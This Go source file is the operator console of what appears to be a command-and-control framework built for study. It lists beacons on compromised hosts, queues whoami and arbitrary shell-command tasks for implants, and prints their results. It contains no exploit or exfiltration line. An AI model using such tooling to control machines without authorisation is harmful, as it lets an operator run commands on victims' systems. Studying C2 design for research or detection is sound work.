// Package console provides an interactive local operator console for managing
// beacons and tasks on a running C2 server.
package console

import (
	"bufio"
	"fmt"
	"os"
	"strings"
	"time"

	"xhc2_for_studying/protocol"
	"xhc2_for_studying/server/core"
	"xhc2_for_studying/server/store"
)

// Console is the local operator console for managing beacons and tasks.
// The same methods can be exposed via RPC for remote management.
type Console struct {
	BeaconStore  store.BeaconStore
	TaskStore    store.ServerTaskStore
	SessionStore *store.SessionStore
}

// Run starts the interactive command-line interface. It blocks until the
// user types "exit".
func (c *Console) Run() {
	scanner := bufio.NewScanner(os.Stdin)
	fmt.Print("c2> ")
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			fmt.Print("c2> ")
			continue
		}
		parts := strings.Fields(line)
		cmd := parts[0]
		args := parts[1:]

		switch cmd {
		case "beacons":
			c.cmdBeacons()
		case "tasks":
			c.cmdTasks(args)
		case "task":
			c.cmdTask(args)
		case "result":
			c.cmdResult(args)
		case "help":
			c.cmdHelp()
		case "exit":
			fmt.Println("bye")
			os.Exit(0)
		default:
			fmt.Printf("unknown command: %s (type help)\n", cmd)
		}
		fmt.Print("c2> ")
	}
}

func (c *Console) cmdBeacons() {
	ids := c.BeaconStore.ListIDs()
	if len(ids) == 0 {
		fmt.Println("(no beacons)")
		return
	}
	for _, id := range ids {
		b, err := c.BeaconStore.Get(id)
		if err != nil {
			fmt.Printf("%s (error: %v)\n", id, err)
			continue
		}
		fmt.Printf("%s  %s@%s  %s/%s  interval=%ds  last_checkin=%d\n",
			b.ID, b.Username, b.Hostname, b.OS, b.Arch, b.Interval, b.LastCheckIn)
	}
}

func (c *Console) cmdTasks(args []string) {
	if len(args) == 1 {
		c.cmdResult(args)
		return
	}
	// List a summary of all tasks. The task store does not expose a global
	// List method, so iterate by beacon dimension instead.
	ids := c.BeaconStore.ListIDs()
	found := false
	for _, bid := range ids {
		tasks := c.TaskStore.GetPendingTasksByImplantID(bid)
		for _, t := range tasks {
			fmt.Printf("%s  %s  %s  %s\n", t.TaskID, t.ImplantID, t.Type, t.Status)
			found = true
		}
	}
	if !found {
		fmt.Println("(no pending tasks)")
	}
}

func (c *Console) cmdTask(args []string) {
	if len(args) < 2 {
		fmt.Println("usage: task <type> <implant_id> [payload]")
		return
	}
	taskType := args[0]
	implantID := args[1]
	payload := ""
	if len(args) > 2 {
		payload = strings.Join(args[2:], " ")
	}

	// Validate the task type.
	switch taskType {
	case protocol.TaskTypeNoop, protocol.TaskTypeWhoami, protocol.TaskTypeShell:
	default:
		fmt.Printf("unknown task type: %s (noop, whoami, shell)\n", taskType)
		return
	}

	// Verify the beacon exists.
	if _, err := c.BeaconStore.Get(implantID); err != nil {
		fmt.Printf("beacon not found: %s\n", implantID)
		return
	}

	task := &core.ServerTask{
		TaskID:    fmt.Sprintf("task-%d", nowNano()),
		Type:      taskType,
		ImplantID: implantID,
		Payload:   payload,
		Status:    protocol.TaskStatusPending,
	}
	if err := c.TaskStore.AddTask(task); err != nil {
		fmt.Printf("create task: %v\n", err)
		return
	}
	fmt.Printf("[+] created: %s\n", task.TaskID)
}

func (c *Console) cmdResult(args []string) {
	if len(args) < 1 {
		fmt.Println("usage: result <task_id>")
		return
	}
	taskID := args[0]
	task, err := c.TaskStore.GetTask(taskID)
	if err != nil {
		fmt.Printf("task not found: %s\n", taskID)
		return
	}
	fmt.Printf("Task ID:    %s\n", task.TaskID)
	fmt.Printf("Type:       %s\n", task.Type)
	fmt.Printf("Implant:    %s\n", task.ImplantID)
	fmt.Printf("Status:     %s\n", task.Status)
	if task.Error != "" {
		fmt.Printf("Error:      %s\n", task.Error)
	}
	if task.Result.Output != "" {
		fmt.Printf("Output:     %s\n", task.Result.Output)
	}
	if !task.CompletedAt.IsZero() {
		fmt.Printf("Completed:  %s\n", task.CompletedAt)
	}
}

func (c *Console) cmdHelp() {
	fmt.Println(strings.TrimSpace(`
commands:
  beacons                  list registered beacons
  tasks                    list pending tasks
  task <type> <beacon> [payload]  create a task (type: noop, whoami, shell)
  result <task_id>         show task result
  help                     this message
  exit                     shutdown server
	`))
}

func nowNano() int64 {
	return time.Now().UnixNano()
}
